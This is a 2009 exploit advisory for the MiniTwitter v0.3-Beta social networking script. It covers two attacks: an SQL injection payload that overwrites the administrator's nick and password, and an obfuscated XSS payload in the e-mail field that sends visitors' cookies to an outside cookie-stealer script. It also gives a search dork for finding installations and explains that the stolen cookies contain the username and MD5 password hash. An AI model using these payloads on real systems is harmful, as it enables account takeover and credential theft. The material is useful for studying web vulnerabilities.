@@ -1,0 +1,178 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	      	MULTIPLE REMOTE VULNERABILITIES			      	     |
+|--------------------------------------------------------------------------------------------|
+|                         	|    MiniTwitter v0.3-Beta     |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://mt.bioscriptsdb.com/          				                     |
+|-->DOWNLOAD: http://sourceforge.net/projects/minitt/           	                     |
+|-->DEMO: http://www.bioscripts.net/minitwitter/index.php   	     			     |
+|-->CATEGORY: Social Networking								     |
+|-->DESCRIPTION: Your business needs a private twitter. You can add...		       	     |
+|		several twitters account and use this twitter as a buckup of all...	     |
+|-->RELEASED: 2009-05-01								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: "BioScripts"							                     |
+|-->CATEGORY: USER OPTIONS CHANGING (SQLi) / COOKIE STEALER (XSS)			     |
+|-->AFFECT VERSION: <= 0.3 Beta				 			             |
+|-->Discovered Bug date: 2009-05-01							     |
+|-->Reported Bug date: 2009-05-02							     |
+|-->Fixed bug date: 2009-05-10								     |
+|-->Info patch (0.4 Beta): http://sourceforge.net/projects/minitt/  			     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+
+##############################
+//////////////////////////////
+
+USER OPTIONS CHANGING (SQLi):
+
+/////////////////////////////
+##############################
+
+
+<<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+
+
+-----------
+FILE VULN:
+-----------
+
+...
+
+$nombre = $_POST["nombre"];
+$apellidos = $_POST["apellidos"];
+$dia = $_POST["fechadia"];
+$mes = $_POST["fechames"];
+$anio = $_POST["fechaanio"];
+$correo = $_POST["correo"];
+$bio = $_POST["bio"];
+$gravatar = $_POST["gravatar"];
+$timeline = $_POST["timeline"];
+$country = $_POST["country"];
+$state = $_POST["state"];
+$sex = $_POST["sex"];
+$show = $_POST["showing"];
+
+...
+
+$pass1 = $_POST["pass1"];
+$pass2 = $_POST["pass2"];
+
+...
+
+$optquery  = "UPDATE mt_users SET nombre = '$nombre', apellidos = '$apellidos', country = '$country', state='$state', sex='$sex', correo = '$correo', dia = '$dia', mes = '$mes', anio = '$anio', bio = '$bio', gravatar = '$gravatar' , timeline = '$timeline', showing = '$show', twitter = '$twitter', accounts = '$twitteraccounts' WHERE id_usr = '$id_usr'";
+
+...
+
+
+------
+PoC:
+------
+
+
+When an user change his options, he can inject sql code and change options of other user
+
+Choose any option, for example name.
+
+Name: name=y3nh4ck3r', [SQL] /*
+
+
+---------
+EXPLOIT:
+---------
+
+Name: name=y3nh4ck3r',apellidos = 'y3nh4ck3r', nick='y3nh4ck3r' country = 'y3nh4ck3r', state='y3nh4ck3r', sex='0', password=MD5(12345) correo = 'y3nh4ck3r@gmail.com', dia = '0', mes = '0', anio = '0', bio = 'y3nh4ck3r', gravatar = '' , timeline = '', showing = '', twitter = '', accounts = '' WHERE id_usr = '1'/*
+
+
+Return: Changed options for user id 1. 
+
+nick=y3nh4ck3r
+password=12345
+
+
+
+#############################
+/////////////////////////////
+
+COOKIES STEALING VULN (XSS):
+
+/////////////////////////////
+#############################
+
+
+<<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>
+
+
+---------
+EXPLOIT:
+---------
+
+
+Go to Link --> http://[HOST]/[HOME_PATH]/index.php?go=opt
+
+Change your e-mail to:
+
+
+<script>document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,101,120,112,108,111,105,116,45,99,111,111,107,105,101,115,47,119,97,105,116,105,110,103,45,102,111,114,46,112,104,112,63,99,107,61)+document.cookie</script>
+
+
+Use your PHP Script (Cookies Stealer)
+ 
+
+When you steal the cookies, you always could log in because their format is:
+
+
+cooknameuniversal= nick user
+
+passnameuniversal= password (md5 hash)
+
+
+So they are universal :P
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-26]
